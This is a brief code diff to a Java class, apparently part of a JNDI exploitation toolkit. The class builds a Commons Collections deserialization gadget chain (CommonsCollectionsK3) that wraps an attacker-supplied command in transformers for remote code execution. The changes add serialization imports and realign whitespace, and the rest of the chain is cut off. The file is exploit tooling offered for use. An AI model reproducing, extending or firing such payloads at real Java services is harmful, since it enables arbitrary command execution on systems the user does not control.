@@ -4,6 +4,7 @@ import com.nu1r.jndi.enumtypes.PayloadType;
 import com.nu1r.jndi.gadgets.annotation.Authors;
 import com.nu1r.jndi.gadgets.annotation.Dependencies;
 import com.nu1r.jndi.gadgets.utils.Reflections;
+import com.nu1r.jndi.gadgets.utils.Serializer;
 import com.nu1r.jndi.gadgets.utils.cc.TransformerUtil;
 import org.apache.commons.collections.Transformer;
 import org.apache.commons.collections.functors.ChainedTransformer;
@@ -11,6 +12,8 @@ import org.apache.commons.collections.functors.ConstantTransformer;
 import org.apache.commons.collections.keyvalue.TiedMapEntry;
 import org.apache.commons.collections.map.LazyMap;
 
+import java.io.ByteArrayOutputStream;
+import java.util.Arrays;
 import java.util.HashMap;
 import java.util.Map;
 
@@ -19,7 +22,7 @@ import java.util.Map;
 public class CommonsCollectionsK3 implements ObjectPayload<Object> {
 
     public Object getObject(PayloadType type, String... param) throws Exception {
-        String command = param[0];
+        String        command          = param[0];
         Transformer[] fakeTransformers = new Transformer[]{new ConstantTransformer(1)};
         Transformer[] transformers     = TransformerUtil.makeTransformer(command);
         Transformer   transformerChain = new ChainedTransformer(fakeTransformers);
